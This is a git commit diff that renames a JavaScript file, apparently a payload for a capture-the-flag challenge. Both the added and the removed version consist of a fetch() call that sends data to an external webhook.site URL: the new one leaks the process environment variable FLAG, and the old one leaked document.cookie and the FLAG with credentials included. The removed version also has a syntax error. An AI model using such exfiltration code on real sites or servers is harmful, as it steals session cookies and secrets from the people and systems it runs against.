23a51643739a7218ccd29a27dfc2d5909b181648
shyeun <96280288+shyeun@users.noreply.github.com>
2022-01-28 20:15:43 +0900

    Update and rename ad.js to aad.js

---
+++ aad.js
@@ -0,0 +1,5 @@
+fetch('https://webhook.site/fb6f68c3-2ba1-4413-9b6a-eec76e47338b?a='+process.env.FLAG,{
+  method:'GET',
+  mode: 'no-cors',
+  credentials: 'include'
+})
--- ad.js
+++
@@ -1,9 +0,0 @@
-fetch('https://webhook.site/fb6f68c3-2ba1-4413-9b6a-eec76e47338b?a='+document.cookie,{
-  method:'POST',
-  mode: 'no-cors',
-  credentials: 'include'
-  body: JSON.stringify({
-        flag: process.env.FLAG
-    })
-})
-
